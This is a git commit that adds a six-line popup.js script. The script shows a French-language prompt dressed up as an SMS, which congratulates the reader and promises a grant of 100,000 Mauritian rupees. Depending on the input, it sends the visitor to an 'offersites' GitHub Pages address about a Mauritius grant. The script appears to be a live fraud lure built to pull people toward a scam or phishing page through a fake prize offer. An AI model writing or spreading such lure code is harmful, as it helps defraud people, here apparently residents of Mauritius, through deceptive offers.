b5809a2d7d1df77b3c0ea0749a3a29d8601aa892
offersites <havast1920@gmail.com>
2024-12-13 08:51:23 +0100

    Create popup.js

---
+++ popup.js
@@ -0,0 +1,6 @@
+
+var password = 'OBTENEZ 100,000 MUR'
+password=prompt('SMS :Félicitations, obtenez une subvention de 100,000 MUR maintenant, appuyez sur OK pour obtenir le vôtre  ','OBTENEZ 100,000 MUR');
+if (password != 'OBTENEZ 100,000 MUR') {
+location.href='https://offersites.github.io/grant-mauritius';
+}
